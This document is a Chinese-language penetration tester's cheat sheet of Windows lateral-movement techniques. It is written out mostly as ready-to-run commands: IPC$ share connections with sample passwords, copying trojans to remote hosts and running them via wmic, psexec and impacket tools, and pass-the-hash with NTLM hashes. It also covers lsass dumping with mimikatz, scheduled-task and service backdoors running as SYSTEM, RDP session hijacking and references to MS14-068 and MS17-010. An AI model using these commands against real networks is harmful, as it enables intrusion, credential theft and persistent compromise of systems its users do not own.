实战中记录下横向的一些方法，打内网第一步是免杀，其次是横向扩展，横向会碰见很多奇怪的问题，要么权限不够，要不组策略错误，所以总结经常用的基于口令和漏洞的横向扩展方法



![图片](https://user-images.githubusercontent.com/118274389/229700985-35b5534e-3c49-4a54-81ac-606ab91fa106.png)





## 0x00 碰见的横向移动方法总结1_IPC（部分，慢慢更新）

    主机开启139和445端口，IPC移动  
    shell net use \\192.168.10.23\ipc$ "Psft24680!!@@62##" /user:"Administrator"  
    
    查看远程主机文件
    
    
    dir \\192.168.52.143\c$
    dir \\192.168.52.143\c$\xx文件夹
    
    在本地传个马，copy过去    
    shell copy C:\\Windows\\Temp\\ma.exe \\192.168.10.23\c$\Windows\Temp\ma.exe
    shell copy 123.exe \\192.168.250.50\c$
      
    wmic远程执行 
    shell wmic /node:192.168.10.23 /user:Administrator /password:Psft24680!!@@62## process call create "cmd.exe /c C:\\Windows\\Temp\\ma.exe"
    
    也可以使用psexec进行远程执行
    
    psexec.exe -accepteula \\192.168.41.150 -h -d c:\wanli.exe
    
    如果发现很久没有上线，可能目标不出网

## 0x01 横向移动方法总结2_beacon
 
    SMB Beacon使用命名管道和父级命名管道进行通信,所以利用他可进行横向移动
    
    使用条件
    
    使用SMB的主机必修接受445端口打开
    只能链接由同一Cobalt Strike实例管理的Beacon
## 0x02 横向移动方法3_PTH攻击

        将procdump上传都目标机
        
        procdump64.exe -accepteula -ma lsass.exe lsass.dmp
        
        将lsass.dmp回传到本地
        
        通过mimikatz获取密码
        
        "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"
        
        
        Procdump下载地址：https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump
        
        mimikatz下载地址：https://github.com/gentilkiwi/mimikatz/releases

## 0x03 基于psexec和smbexec横向

    psexec工具功能之一是远程启动交互式shell,这个工具不需要对方开启3389端口，只需要开启admin$共享即可。
    
    使用方法1
    
    1.psexec 需要建立ipc连接进行横向移动
    
     net use \\192.168.3.144\ipc$ “admin!@#45” /user:"administrator"  #和对方建立IPC链接，出现弹框点击agree
     psexec \\192.168.3.64 -s cmd cmd     #   -s,表示以system权限运行窗口，成功返回目标主机system权限窗口
     
    2.ps不需要建立ipc连接进行横向移动
     
     前提开启admin$共享
    
     psexec \\192.168.3.144 -u administrator -p admin123！！ -s cmd   #实战中碰见很多未知问题，可以换其他的横向方法
     
     注意官方自带的psexec只能通过明文进行传递攻击，密码是行不通的，例如 psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.144 是不可以的
     
    3.利用impacket中的工具包进行横向渗透，可解决密文攻击问题
    
      impacket工具包里有个psexec，可进行密文传递攻击，下载地址：https://github.com/maaaaz/impacket-examples-windows
      
      psexec -hashes :518b98ad4178a53695dc997aa02d455c ./administrator@192.168.3.144
      
      这块记录给自己留个作业，可以写个工具，针对不同的用户和密码进行组合后进行喷洒。
    
    4.smbexec无需IPC连接进行横向移动
    
      smbexec.exe mssql:Admin@1234@192.168.251.252 # 连接本地用户组
      
      smbexec.exe ROOTKIT.ORG/administrator:admin!@#45@192.168.3.144  # 连接域内用户
      
      ![图片](https://user-images.githubusercontent.com/118274389/229289834-9cdb8adb-9302-47bb-9925-609ac5db69e6.png)

      
    以上方法CS里自带该功能。

## 0x04 横向移动方法4_票据攻击

    参考；https://blog.csdn.net/qq_56426046/article/details/127819030

## 0x05 横向移动方法5_远控攻击

  远控攻击就是给目标装一些免安装的远控软件，例如：向日葵、todesk

  https://github.com/wafinfo/Sunflower_get_Password
  
  不过目前向日葵、todesk不是很好用，发现了一个小巧的软件GoToHTTP
  
  官方地址 http://www.gotohttp.com/ 
 
  
  ![图片](https://user-images.githubusercontent.com/118274389/230065346-c65c7e13-8569-496a-8409-a3718fcf566e.png)
  
   在软件根目录产生的密码信息
  
   [general]

   host = https://xx.com
   name = 12222424
   tmp = 2232

  
  
## 0x06 利用WMI进行横向移动攻击

  WMI的全名为（Windows Management Instrumentation）由于安全厂商开始将PsExec加入了黑名单，所以攻击者暴露的可能性陡然增加。根据研究情况来看，Windows操作系统默认不会将WMI的   操作记录到日志当中，而且因为采用的是无文件攻击，所以导致WMI具有极高的隐蔽性。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执   行、权限持久化等操作。
  Windows操作系统都支持WMI。WMI是由一系列工具集组成的，可以在本地或者远程管理计算机系统。通过135端口进行利用，支持用户名明文或者hash的方式进行认证，并且该方法不会在目标日志系   统留下痕迹。
  
  利用系统自带的wmi进行明文横向扩展
  
  wmic /node:192.168.3.144 /user:administrator /password:admin!@#45 process call create "md.exe /c ipconfig >C:\3.txt"
  
  在使用自带的wmic时，无回显，ipconfig这条命令显示的内容保存在3.txt文件中，并且是在对方的主机中，较为鸡肋。

## 0x07 利用impacket工具包中的wmiexec进行横向移动

   命令：wmiexec ./Administrator:admin!@#45@192.168.3.144 "whoami" ##如果直接上CS的话，上线后的权限为administrator
   
   hash攻击命令：wmiexec -hashes :518b98ad4178a53695dc997aa02d455c Administrator@192.168.3.73 "whoami"
   
 ## 0x08 IPC+windows服务进行横向移动
 
    该方法横向是将木马传入到对方机器里，通过SC命令创建window来指向该传入的木马，重启该服务或者重启机器达到上线CS的目的，该横向步骤如下；
    
    1.创建IPC$连接。
    
    2.将要运行的服务拷贝到目标机器。
    
    3.执行 sc \\192.168.3.144 create cmd binpath="c:\cmd.bat"
    
    参考文章：https://www.freesion.com/article/2259895176/
    
 ## 0x09 IPC+计划任务进行横向移动
 
     利用AT进行横向移动
 
     1.先建立IPC任务 net use \\192.168.3.144\ipc$ "admin!@#45"/user:rookit.org\administrator
    
     2.添加添加用户bat脚本，也可以添加木马脚本
     
     3.将bat脚本发送到目标机器copy 1.bat \\192.168.3.144\c$
     
     4.利用at启动该bat脚本 at \\192.168.1.144 20:05 c:\adduser.bat （2008及以后系统不在使用at命令，可以尝试其他命令进行启动，如schtasks）
     
      每一分钟启动一次shell.exe木马
     
     schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1  /tr c:\shell.exe /ru system /f
     
     在没有建立ipc连接前提，可以添加账户密码方式进行启动shell.exe木马（启动成功前提：具有管理员权限）
     
     schtasks /create /s 192.168.183.130 /u administrator /p Liu78963 /tn backdoor /sc minute /mo 1 /tr c:\shell.exe /ru system /f
     
     要是碰见schtasks启动不成功，可以尝试psexec、wmiexec等工具
 
      参考：https://cloud.tencent.com/developer/article/1743842
 
   
  
  
## 0x10 其他横向技巧

  Windows Server 2012及以上不提取密码登录Administrator桌面（登录这个桌面目的是看看Administrator桌面有啥，方便横向）
  
  2012及高版本想要得到密码，只能通过修改注册表，然后让管理员重新登录主机才能得到密码，一般服务器重新进行登录时候很少。我们可以通过一些技巧得到Administrator权限，
  
  拿到shell后，whoami是system权限，可以添加用户后，上隧道把远程桌面代理出来，此时的权限仍然是system权限
  
  此时想要得到Administrator权限步骤如下：
  
  1.psexec启动一个system权限的cmd  命令：psexec.exe -s -i cmd.exe  
  
  2.query user 
  
  3.查看administrator会话id   
  
  4.tscon 1 切换会话id为Administrator权限
  
  
  ## 0x11 基于漏洞横向移动方法
  
  MS14-068 这个洞的危害很大，可以在任意域用户提权到域管
  适用版本：server2000以上 
  补丁：kb3011780
  
  MS17-010
  
  
  
       
  
  
  
  
  
  


